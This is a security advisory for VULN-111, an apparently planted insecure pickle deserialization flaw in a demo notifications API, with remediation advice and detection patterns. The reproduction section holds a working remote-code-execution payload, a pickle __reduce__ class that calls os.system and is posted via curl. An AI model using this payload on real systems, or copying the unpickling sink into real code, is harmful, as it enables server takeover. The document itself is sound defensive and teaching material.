# VULN-111 — Insecure deserialization in notification context import

| Field | Value |
|-------|-------|
| ID | VULN-111 |
| Domain | notifications |
| CWE | CWE-502 (Deserialization of Untrusted Data) |
| OWASP Top 10 (2021) | A08:2021 – Software and Data Integrity Failures |
| Severity | Critical |
| Location | `backend/app/routers/notifications.py:287-293` (`import_context`) |
| Introduced by | Workstream 10 — notifications (branch `devin/iberia-notifications`) |

## Description

`POST /api/notifications/context/import` lets an operator bulk-load a "notification render
context" bundle exported by a partner integration. The request carries a **base64-encoded
blob** and a `format` selector. When `format == "pickle"` (the default) the handler decodes
the base64 and calls `pickle.loads()` on the bytes directly:

```python
raw = base64.b64decode(payload.payload)
data = pickle.loads(raw)   # planted VULN-111 sink
```

`pickle` is not a data format — it is a serialized-object *program*. During unpickling,
Python invokes `__reduce__`/`__setstate__` on the encoded objects, so a crafted payload
executes arbitrary Python (and therefore arbitrary OS commands) **on the notification host**
before any of the "is it a dict?" validation below it ever runs.

## Reproduction

```bash
TOKEN=$(cd backend && .venv/bin/python -c \
  "from app.core.security import create_access_token; print(create_access_token('ops@iberia.demo','ops'))")

# Build a malicious pickle that runs a command on load (writes a marker file here for the demo).
PAYLOAD=$(python3 - <<'PY'
import base64, os, pickle
class RCE:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned_by_vuln111.txt",))
print(base64.b64encode(pickle.dumps(RCE())).decode())
PY
)

curl -s -X POST http://127.0.0.1:8000/api/notifications/context/import \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d "{\"payload\":\"$PAYLOAD\",\"format\":\"pickle\"}"

cat /tmp/pwned_by_vuln111.txt   # -> command output: the server executed our code
```

A benign payload round-trips too (this is what the happy-path test uses), proving the sink is
live without breaking the suite:

```bash
PAYLOAD=$(python3 -c "import base64,pickle;print(base64.b64encode(pickle.dumps({'passenger_name':'PWNED'})).decode())")
# -> {"status":"loaded","keys":["passenger_name"],"context":{"passenger_name":"PWNED"}}
```

Expected insecure result: arbitrary code execution as the backend user (remote shell,
credential theft, pivot). The marker file `/tmp/pwned_by_vuln111.txt` appears with command
output.

## Blast radius

* **Full remote code execution** on the notification host as the API process user →
  read `IBERIA_JWT_SECRET`, forge tokens for any role, read the SQLite database, reach every
  internal service (compounds with VULN-110), install persistence.
* Gated behind an `ops`/`sre`/`admin` token, so the realistic entry points are a stolen
  operator credential, a leaked token, or an SSRF/CSRF chain — but once reached the impact is
  total compromise of the backend.

## Intended remediation

* **Never unpickle untrusted input.** Delete the pickle branch entirely and accept only a
  safe, schema-validated format — JSON parsed into an explicit Pydantic model (the handler
  already supports `format="json"`; make it the *only* option).
* Validate the shape (keys/types) *before* materialising anything, and cap payload size.
* If a binary interchange format is genuinely required, use one without code execution
  semantics (e.g. MessagePack) plus a schema, and authenticate the source with a signature
  (HMAC / signed upload) so integrity is verified before parsing.

## Detection hints

* Grep: `pickle.loads`, `pickle.load`, `yaml.load(` without `Loader=SafeLoader`,
  `cPickle`, `jsonpickle`, `dill`.
* The `# noqa: S301` / `# noqa: S403` suppressions in this file mark exactly where Bandit
  would otherwise flag it — treat suppressed S301/S403 as a review red flag.
* Log signature: `iberia.notifications` `"notification context imported"` with `fmt=pickle`.
* Runtime: unexpected child processes spawned by the API worker, or the API process making
  outbound connections right after a `/context/import` call.
